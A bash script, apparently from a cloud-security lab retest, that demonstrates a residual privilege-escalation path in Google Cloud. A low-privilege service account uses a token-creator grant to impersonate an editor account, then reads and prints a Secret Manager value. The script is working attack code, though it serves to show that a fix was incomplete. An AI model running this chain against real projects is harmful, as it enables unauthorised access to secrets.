#!/usr/bin/env bash
#
# residual.sh - Act 2 (the retest angle): after the "fix", the token-creator
# grant still lets the low-priv principal impersonate an editor SA and read data.
#
#   you --(impersonate)--> low-priv --(project-level tokenCreator)--> app-runtime (editor) --> read secret
#
set -euo pipefail
cd "$(dirname "$0")"
source ./config.env
source ./lab.state

command -v python3 >/dev/null || { echo "ERROR: python3 required for JSON parsing."; exit 1; }

LOWPRIV="${LOWPRIV_SA}@${PROJECT_ID}.iam.gserviceaccount.com"
RUNTIME="${RUNTIME_SA}@${PROJECT_ID}.iam.gserviceaccount.com"

echo "============================================================"
echo " RESIDUAL PATH - token creator -> impersonate editor SA"
echo "============================================================"

echo "[1/3] Acting as the low-priv principal (impersonation, no keys)..."
LP_TOKEN="$(gcloud auth print-access-token --impersonate-service-account="${LOWPRIV}")"

echo "[2/3] As low-priv, minting an access token for the EDITOR SA...   >>> SCREENSHOT 4"
RT_TOKEN="$(curl -s -X POST \
  -H "Authorization: Bearer ${LP_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${RUNTIME}:generateAccessToken" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["accessToken"])')"
echo "      -> got an access token for ${RUNTIME} (editor) without holding any owner role."

echo "[3/3] Using the editor token to read the 'customer' secret...   >>> SCREENSHOT 5"
SECRET_VAL="$(curl -s \
  -H "Authorization: Bearer ${RT_TOKEN}" \
  "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${SECRET_NAME}/versions/latest:access" \
  | python3 -c 'import sys,json,base64; print(base64.b64decode(json.load(sys.stdin)["payload"]["data"]).decode())')"

echo
echo "[+] Secret value read via the residual path: ${SECRET_VAL}"
echo "    => The partial fix closed the OWNER path, but data access remained reachable."
